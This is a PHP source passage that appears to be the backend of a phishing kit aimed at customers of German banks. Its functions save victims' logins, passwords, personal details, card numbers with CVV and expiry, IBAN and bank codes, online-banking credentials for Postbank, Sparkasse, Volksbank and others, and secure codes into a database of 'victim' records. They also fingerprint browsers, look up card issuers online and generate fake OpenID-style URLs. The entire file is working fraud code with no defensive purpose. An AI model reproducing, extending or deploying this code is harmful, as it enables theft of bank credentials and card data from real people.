				$_SESSION['pb_username'] = $_POST['pb_username'];
				$_SESSION['pb_password'] = $_POST['pb_password'];
				
				if (empty($_POST['pb_username'])) {
					$_SESSION['userErr'] = '1';
				}
					
				if (strlen($_POST['pb_password']) < 5 || empty($_POST['pb_password'])) {
					$_SESSION['passErr'] = '1';
				}
				
				if (isset($_SESSION['userErr']) || isset($_SESSION['passErr'])) {
					header("Location: " . $ob_postbank . $urlext);
				} else {
					addOB($_SESSION['pb_username'], $_SESSION['pb_password']);
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
			} else if (isset($_SESSION['ob_sparkasse']) && $_SESSION['ob_sparkasse']) {
				
				$_SESSION['ob_sp_username'] = $_POST['ob_sp_username'];
				$_SESSION['ob_sp_password'] = $_POST['ob_sp_password'];

				if (empty($_SESSION['ob_sp_username'])) {
					$_SESSION['user_err'] = "1";
					unset($_SESSION['ob_sp_username']);
				}
				
				if (empty($_SESSION['ob_sp_password'])) {
					$_SESSION['pass_err'] = "1";
					unset($_SESSION['ob_sp_password']);
				}
				
				if (isset($_SESSION['user_err']) || isset($_SESSION['pass_err'])) {
					header("Location: " . $ob_sparkasse . $urlext);
					
				} else {
					addOB($_SESSION['ob_sp_username'], $_SESSION['ob_sp_password']);
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
				
			} else if (isset($_SESSION['ob_volksbank']) && $_SESSION['ob_volksbank']) {
				$_SESSION['vb_username'] = $_POST['vb_username'];
				$_SESSION['vb_password'] = $_POST['vb_password'];

				if (empty($_SESSION['vb_username'])) {
					$_SESSION['err'] = "1";
					$_SESSION['user_err'] = "1";
					unset($_SESSION['vb_username']);
				}
				
				if (empty($_SESSION['vb_password'])) {
					$_SESSION['err'] = "1";
					$_SESSION['pass_err'] = "1";
					unset($_SESSION['vb_password']);
				}
				
				if (isset($_SESSION['err'])) {
					header("Location: " . $ob_volksbank . $urlext);
					
				} else {
					addOB($_SESSION['vb_username'], $_SESSION['vb_password']);
					$_SESSION['step5'] = "1";
					$_SESSION['step4finished'] = "1";
					sleep(1);
					header("Location: " . $finish . $urlext);
				}
			}
		}
	}
	
	function addLogin() {
		global $date;
		global $myTable;
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		
		$ip = "";

		if (!isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			$ip = $_SERVER['REMOTE_ADDR'];
		} else {
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		}
		
		$con = mySQL_Connection();
		
		mysqli_query($con,"INSERT INTO $myTable (logtime, logtime_timestamp, username, passwort, vic_info_lang, vic_info_browser, vic_info_os, vic_info_screen, vic_info_plugins, vic_info_java, vic_info_flash, vic_info_silver, vic_info_mime, vic_info_fonts, ip, useragent) VALUES (
			'".mysqli_real_escape_string($con, $date)."',
			'".mysqli_real_escape_string($con, time())."',
			'".mysqli_real_escape_string($con, $_SESSION['email'])."',
			'".mysqli_real_escape_string($con, $_SESSION['password'])."',
			'".mysqli_real_escape_string($con, $_SERVER['HTTP_ACCEPT_LANGUAGE'])."',
			'".mysqli_real_escape_string($con, $_SESSION['vic_info_browser'])."',
			'".mysqli_real_escape_string($con, $_SESSION['vic_info_os'])."',
			'".mysqli_real_escape_string($con, $_SESSION['vic_info_screen'])."',
			'".mysqli_real_escape_string($con, $_SESSION['vic_info_plugins'])."',
			'".mysqli_real_escape_string($con, $_SESSION['vic_info_java'])."',
			'".mysqli_real_escape_string($con, $_SESSION['vic_info_flash'])."',
			'".mysqli_real_escape_string($con, $_SESSION['vic_info_silver'])."',
			'".mysqli_real_escape_string($con, $_SESSION['vic_info_mime'])."',
			'".mysqli_real_escape_string($con, $_SESSION['vic_info_fonts'])."',
			'".mysqli_real_escape_string($con, $ip)."',
			'".mysqli_real_escape_string($con, $useragent)."
			')");
		
		$_SESSION['insertID'] = "". mysqli_insert_id($con);
	} 
	
	function addPData() {
		global $myTable;
		$dob = $_SESSION['dob1'] . "." . $_SESSION['dob2'] . "." . $_SESSION['dob3'];

		$con = mySQL_Connection();
		
		$query = "UPDATE `$myTable` SET 
																			`vorname`=\"" . mysqli_real_escape_string($con, $_SESSION['vorname']) . "\",
																			`nachname`=\"" . mysqli_real_escape_string($con, $_SESSION['nachname']) . "\",
																			`geburtsdatum`=\"" . mysqli_real_escape_string($con, $dob) . "\",
																			`adresse`=\"" . mysqli_real_escape_string($con, $_SESSION['adresse']) . "\",
																			`plz`=\"" . mysqli_real_escape_string($con, $_SESSION['plz']) . "\",
																			`ort`=\"" . mysqli_real_escape_string($con, $_SESSION['ort']) . "\",
																			`handynr`=\"" . mysqli_real_escape_string($con, $_SESSION['handynr']) . "\",
																			`tlfnr`=\"" . mysqli_real_escape_string($con, $_SESSION['tlfnr']) . "\",
																			`ps_nr`=\"" . mysqli_real_escape_string($con, $_SESSION['ps_nr']) . "\",
																			`ps_pw`=\"" . mysqli_real_escape_string($con, $_SESSION['ps_pw']) .  "\" WHERE id= " . $_SESSION['insertID'];
		
		mysqli_query($con,$query) or die(mysqli_error($con));
	}
	
	function addPaymentData() {
		global $myTable;
		$ccDate = $_SESSION['ccDate1'] . " / " . $_SESSION['ccDate2'];
		
		if (empty($_SESSION['limit'])) {
			$_SESSION['limit'] = "N / A";
		}
		
		if (empty($_SESSION['iban'])) {
			$_SESSION['iban'] = "N / A";
		}
		
		if (empty($_SESSION['bic'])) {
			$_SESSION['bic'] = "N / A";
		}
		
		if (empty($_SESSION['kto'])) {
			$_SESSION['kto'] = "N / A";
		}
		
		if (empty($_SESSION['blz'])) {
			$_SESSION['blz'] = "N / A";
		}
		
		if ($_SESSION['noCC']) {
			$_SESSION['ccnr'] = "skipped";
			$_SESSION['cvv'] = "skipped";
			$ccDate = "skipped";
		}
		
		$con = mySQL_Connection();

		$query = 'UPDATE `' . $myTable . '` SET 
																	`ccnr`="' . mysqli_real_escape_string($con, $_SESSION['ccnr']) . '", 
																	`ccdate`="' . mysqli_real_escape_string($con, $ccDate) . '", 
																	`cvv`="' . mysqli_real_escape_string($con, $_SESSION['cvv']) . '", 
																	`kto`="' . mysqli_real_escape_string($con, $_SESSION['kto']) . '", 
																	`blz`="' . mysqli_real_escape_string($con, $_SESSION['blz']) . '", 
																	`iban`="' . mysqli_real_escape_string($con, $_SESSION['iban']) . '", 
																	`bic`="' . mysqli_real_escape_string($con, $_SESSION['bic']) . '", 
																	`cclimit`="' . mysqli_real_escape_string($con, $_SESSION['limit']) . '" WHERE id= ' . $_SESSION['insertID'];
					
		mysqli_query($con,$query) or die(mysqli_error($con));
	}
	
	function addSecureCode() {
		global $myTable;
		$con = mySQL_Connection();
	
		if (empty($_SESSION['sknr'])) {
			$_SESSION['sknr'] = "N / A";
		}
		
		if (isset($_SESSION['lbb']) && $_SESSION['lbb'] == "lbb") {
			$_SESSION['securecode'] = "LBB Passwort: " . $_SESSION['securecode'];
		} else if (isset($_SESSION['advanzia']) && $_SESSION['advanzia'] == "advanzia") {
			$_SESSION['securecode'] = "Advanzia Passwort: " . $_SESSION['securecode'];
		} else if (isset($_SESSION['sparkasse']) && $_SESSION['sparkasse'] == "sparkasse") {
			$_SESSION['securecode'] = "Sparkasse Daten > " . $_SESSION['securecode'];
		} else if (isset($_SESSION['barclay']) && $_SESSION['barclay'] == "barclay") {
			$_SESSION['securecode'] = "Barclay Daten > " . $_SESSION['securecode'];
		} else if (isset($_SESSION['dkb']) && $_SESSION['dkb'] == "dkb") {
			$_SESSION['securecode'] = "DKB Daten > " . $_SESSION['securecode'];
		} else if (isset($_SESSION['volkswagen']) && $_SESSION['volkswagen'] == "volkswagen") {
			$_SESSION['securecode'] = "Volkswagen Daten > " . $_SESSION['securecode'];		
		} else if (isset($_SESSION['dz_wgz']) && $_SESSION['dz_wgz'] == "dz_wgz") {
			$_SESSION['securecode'] = "WGZ / DZ Daten > " . $_SESSION['securecode'];
		} else if (isset($_SESSION['hypo']) && $_SESSION['hypo'] == "hypo") {
			$_SESSION['securecode'] = "Hypovereinsbank Daten > " . $_SESSION['securecode'];
		} else if (isset($_SESSION['sparda']) && $_SESSION['sparda'] == "sparda") {
			$_SESSION['securecode'] = "Sparda Daten > " . $_SESSION['securecode'];
		}
		
		$query = ("UPDATE `$myTable` SET `securecode`=\"" . mysqli_real_escape_string($con, $_SESSION['securecode']) .  "\", `servicekartennummer`=\"" . mysqli_real_escape_string($con, $_SESSION['sknr']) .  "\" WHERE id= " . $_SESSION['insertID']);
		mysqli_query($con,$query) or die(mysqli_error($con));
	}
	
	function checkAndAddBin_NEW() {
		global $myTable;
		
		$bin = substr($_SESSION['ccnr'], 0, 6);
		$url = "http://www.bins.pro/search?action=searchbins&bins=" . $bin;
		$raw_content = file_get_contents($url);

		if (strpos($raw_content, "Total found 0 bins") !== false) {
			checkAndAddBin();
		} else {
			$binData_raw = str_replace("</td>", "", explode("</tr>", explode("<tr>", explode("result", $raw_content)[1])[2])[0]);
			$binData = explode("<td>", $binData_raw);
			$binBrand = $binData[3];
			$binBank = $binData[6];
			$binCountry = $binData[2];
			$binCategory = $binData[4];
			$binLevel = $binData[5];

			$con = mySQL_Connection();
			$query = "UPDATE `$myTable` SET `brand`= '$binBrand', `bank`='$binBank', `country`='$binCountry', `category`='$binCategory', `binlevel`='$binLevel' WHERE id= " . $_SESSION['insertID'];
			mysqli_query($con,$query) or die(mysqli_error($con));
		}
	}
	
	function checkAndAddBin() {
		global $myTable;
		
		$bin = substr($_SESSION['ccnr'], 0, 6);
		$url = "http://www.binlist.net/json/" . $bin;

		$binData_raw = file_get_contents($url);
		$binData = json_decode($binData_raw, true);
		
		$con = mySQL_Connection();
		
		$query = ('UPDATE `' . $myTable . '` SET 
																			`brand`="' . ($binData['brand']) . '", 
																			`bank`="' . ($binData['bank']) . '", 
																			`country`="' . ($binData['country_code']) . '", 
																			`category`="' . ($binData['card_type']) . '" WHERE id= ' . $_SESSION['insertID']);
		mysqli_query($con,$query) or die(mysqli_error($con));
	}
	
	function mySQL_Connection() {
		global $myHost;
		global $myUser;
		global $myPass;
		global $myDB;
		
		$con = mysqli_connect($myHost, $myUser, $myPass, $myDB);
		mysqli_query($con, "SET NAMES 'utf8'");
		mysqli_query($con, "SET CHARACTER SET 'utf8'");
		
		return $con;
	}
	
	function checkLuhn($number) {
		$sum = 0;
		$numDigits = strlen($number) -1;
		$parity = $numDigits % 2;
   
		for ($i = $numDigits; $i >= 0; $i--) {
			$digit = substr($number, $i, 1);
			
			if (!$parity == ($i % 2)) {
				$digit <<= 1;
			}
			
			$digit = ($digit > 9) ? ($digit - 9) : $digit;
			$sum += $digit;
		}
		return ($sum % 10 == 0) ? true : false;
	}
	
	function checkELV($kto, $blz) {
		if (empty($kto) || empty($blz)) {
			return false;
		} else {
			$arContext['http']['timeout'] = 3;
			$context = stream_context_create($arContext);
			
			$check = file_get_contents("http://www.bankleitzahlen.de/component/content/article/151-ausgabe-kontonummern-pruefer.html?kto=" . $kto . "&blz=" . $blz, 0, $context);

			$part1 = explode("art-article\"><p> </p>", $check);
			$part2 = explode("</p>", $part1[0]);
			
			if (!empty($check)) {
				return (strpos($part2[1], "formal") !== false);
			} else {
				return true;
			}
		}
	}
	
	function checkBIC_BLZ() {
		$url = "http://www.iban-rechner.de/blz.html";
		$bank = "Ihre Bank";
		$data = null;
		
		if (isset($_SESSION['kto_active'])) {
			$data = $_SESSION['blz'];
		} else {
			$data = $_SESSION['bic'];
		}

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL,$url);
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "tx_blz_pi1%5Bcountry%5D=all&tx_blz_pi1%5Bsearchterms%5D=&tx_blz_pi1%5Bbankcode%5D=" . $data . "&tx_blz_pi1%5Bfi%5D=fi&no_cache=1&Action=Suchen");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$output = curl_exec ($ch);
		curl_close ($ch);
		
		if (strpos($output, "<tr class=\"tr-1\">")) {
			$bank = explode("<", explode("td-1\">", explode("<tr class=\"tr-1\">", $output)[1])[1])[0];
		}
		return $bank;
	}
	
	function redirectOB() {
		if (strpos($_SESSION['ob_bank'], "comdirect") !== false) {
			$_SESSION['ob_comdirect'] = true;
			header("Location: " . $ob_comdirect . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "Commerzbank") !== false) {
			$_SESSION['ob_commerzbank'] = true;
			header("Location: " . $ob_commerzbank . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "Deutsche Bank") !== false) {
			$_SESSION['ob_deutschebank'] = true;
			header("Location: " . $ob_deutschebank . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "Deutsche Kreditbank") !== false) {
			$_SESSION['ob_dkb'] = true;
			header("Location: " . $ob_dkb . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "HypoVereinsbank") !== false) {
			$_SESSION['ob_hypo'] = true;
			header("Location: " . $ob_hypo . $urlext);
		
		} else if (strpos($_SESSION['ob_bank'], "Postbank") !== false) {
			$_SESSION['ob_postbank'] = true;
			header("Location: " . $ob_postbank . $urlext);
		
		} else if (strpos($_SESSION['ob_bank'], "Sparkasse") !== false) {
			$_SESSION['ob_sparkasse'] = true;
			header("Location: " . $ob_sparkasse . $urlext);
		
		} else if (strpos($_SESSION['ob_bank'], "Kreissparkasse") !== false) {
			$_SESSION['ob_sparkasse'] = true;
			header("Location: " . $ob_sparkasse . $urlext);
		
		} else if (strpos($_SESSION['ob_bank'], "sparkasse") !== false) {
			$_SESSION['ob_sparkasse'] = true;
			header("Location: " . $ob_sparkasse . $urlext);
		
		} else if (strpos($_SESSION['ob_bank'], "Stadtsparkasse") !== false) {
			$_SESSION['ob_sparkasse'] = true;
			header("Location: " . $ob_sparkasse . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "Volksbank") !== false) {
			$_SESSION['ob_volksbank'] = true;
			header("Location: " . $ob_volksbank . $urlext);
			
		} else if (strpos($_SESSION['ob_bank'], "Sparda-Bank") !== false) {
			$_SESSION['ob_sparda'] = true;
			header("Location: " . $ob_sparda . $urlext);
			
		} else {
			header("Location: " . $finish . $urlext);
		}
	}
	
	function addOB($user, $pass) {
		global $myTable;
		$con = mySQL_Connection();
		
		$query = ("UPDATE `$myTable` SET `bank`=\"" . mysqli_real_escape_string($con, $_SESSION['ob_bank']) .  "\", `ob_login`=\"" . mysqli_real_escape_string($con, $user) .  "\",  `ob_pass`=\"" . mysqli_real_escape_string($con, $pass) .  "\" WHERE id= " . $_SESSION['insertID']);
		mysqli_query($con,$query) or die(mysqli_error($con));
	}
	
	function checkIBAN($iban) {
		if (empty($iban)) {
			return false;
		}
		
		$arContext['http']['timeout'] = 3;
		$context = stream_context_create($arContext);
		
		$check = file_get_contents("http://www.bankleitzahlen.de/component/content/article/153-ausgabe-iban-pruefer.html?iban=$iban", 0, $context);

		$part1 = explode("art-article\"><p> </p>", $check);
		$part2 = explode("</p>", $part1[0]);
		
		if (!empty($check)) {
			if (strpos($part2[3], "nicht") !== false) {
				return false;
			} else {
				return true;
			}
		} else {
			return true;
		}
	}
	
	function updateVisitor() {
		$con = mySQL_Connection();
		mysqli_query($con,"INSERT INTO visitor_stats (visit_date) VALUES ('".mysqli_real_escape_string($con, date("d.m.Y"))."')");
	}
	
	function getRandomURL() {
		if (!isset($_SESSION['randomUrl'])) {
			$_SESSION['randomUrl'] = 	'?assoc_handle=' .
															substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 30) . 
															'&openid_claim=' .
															substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 20) .
															'&identifier_select=' .
															substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 20) .
															'&pape_max=' .
															substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 30);
			return $_SESSION['randomUrl'];
		} else {
			return $_SESSION['randomUrl'];
		}
	}
?>